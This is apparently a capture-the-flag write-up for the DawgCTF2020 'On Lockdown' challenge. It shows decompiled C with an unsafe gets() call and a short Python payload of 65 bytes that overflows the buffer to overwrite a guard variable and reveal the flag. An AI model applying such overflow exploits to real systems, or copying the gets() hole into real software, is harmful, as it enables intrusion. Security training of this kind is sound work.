
## On Lockdown
### Description

> Better than locked up I guess
>
> nc [ctf.umbccd.io](http://ctf.umbccd.io/) 4500
>
> Author: trashcanna


### Attachment

[onlockdown](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/DawgCTF2020/pwn/onlockdown/onlockdown)

### Analysis

In function `lockdown`, flag will be printed  while `local_10` is not `0`:

```c
void lockdown(void){
  char local_50 [64];
  int local_10;
  
  local_10 = 0;
  puts("I made this really cool flag but Governor Hogan put it on lockdown");
  puts("Can you convince him to give it to you?");
  gets(local_50);
  if (local_10 == 0) {
    puts("I am no longer asking. Give me the flag!");
  }
  else {
    flag_me();
  }
  return;
}
```

and here is a buffer overflow obviously: 

```c
gets(local_50);
```

> layout of satck:   local_50[64]   |   local_10

 `local_10` will be overwrite with the values after 64 bytes of our input string.

### Solution

Overwrite `local_10` with nonzero values by buffer overflow:

```python
offset = 65
payload = 'A'*offset
sla('Can you convince him to give it to you?\n',payload)
```


### More

you can download full exp from my [github](https://github.com/TaQini/ctf/tree/master/DawgCTF2020/pwn/onlockdown) 


